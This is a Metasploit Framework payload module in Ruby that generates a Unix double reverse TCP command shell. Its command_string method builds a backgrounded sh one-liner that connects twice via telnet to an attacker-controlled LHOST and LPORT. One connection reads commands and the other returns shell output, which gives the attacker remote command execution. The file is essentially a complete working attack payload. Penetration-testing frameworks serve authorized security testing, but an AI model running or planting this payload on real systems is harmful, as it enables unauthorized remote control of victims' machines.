##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 130

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Unix Command Shell, Double Reverse TCP (telnet)',
      'Description'   => 'Creates an interactive shell through two inbound connections',
      'Author'        => 'hdm',
      'License'       => MSF_LICENSE,
      'Platform'      => 'unix',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::ReverseTcpDouble,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'telnet',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    cmd =
      "sh -c '(sleep #{3600+rand(1024)}|" +
      "telnet #{datastore['LHOST']} #{datastore['LPORT']}|" +
      "while : ; do sh && break; done 2>&1|" +
      "telnet #{datastore['LHOST']} #{datastore['LPORT']}" +
      " >/dev/null 2>&1 &)'"
    return cmd
  end
end
